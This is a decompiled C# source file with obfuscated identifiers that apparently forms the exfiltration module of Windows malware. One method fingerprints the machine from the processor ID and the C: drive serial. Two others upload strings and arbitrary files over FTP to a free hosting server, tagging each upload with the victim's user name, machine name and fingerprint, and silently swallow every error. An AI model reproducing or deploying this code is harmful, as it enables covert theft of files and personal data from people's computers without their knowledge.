using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace SNDBgbsWAO;

internal sealed class LpcRwcYYzTjJT
{
	public static string AAoaUCAJkzLCfDC()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	public static void lAnyKoqlvAZUd(string WsaZTrVdimkD = "ftp://files.000webhost.com/public_html/", string sBTYcDZXCZosPAo = "FTP UserName", string GxNcAVIVSHuVbj = "FTP Password", string YdBPBpFXfysiiCx = "")
	{
		try
		{
			string text = AAoaUCAJkzLCfDC();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(WsaZTrVdimkD + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(sBTYcDZXCZosPAo, GxNcAVIVSHuVbj);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(YdBPBpFXfysiiCx);
			ftpWebRequest.ContentLength = bytes.Length;
			using (Stream stream = ftpWebRequest.GetRequestStream())
			{
				stream.Write(bytes, 0, bytes.Length);
			}
			using ((FtpWebResponse)ftpWebRequest.GetResponse())
			{
			}
		}
		catch
		{
		}
	}

	public static void YCTIRGAVPFhSUZb(string tHWtEZmsFuBlx = "ftp://files.000webhost.com/public_html/", string nJdRleQSRPch = "FTP UserName", string jSepJbPwGWKY = "ACCESS", string GAURcPsVtMmGjWcA = "")
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Credentials = new NetworkCredential(nJdRleQSRPch, jSepJbPwGWKY);
			webClient.UploadFile(tHWtEZmsFuBlx + string.Format("UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + Path.GetFileName(GAURcPsVtMmGjWcA)), "STOR", GAURcPsVtMmGjWcA);
		}
		catch
		{
		}
	}
}
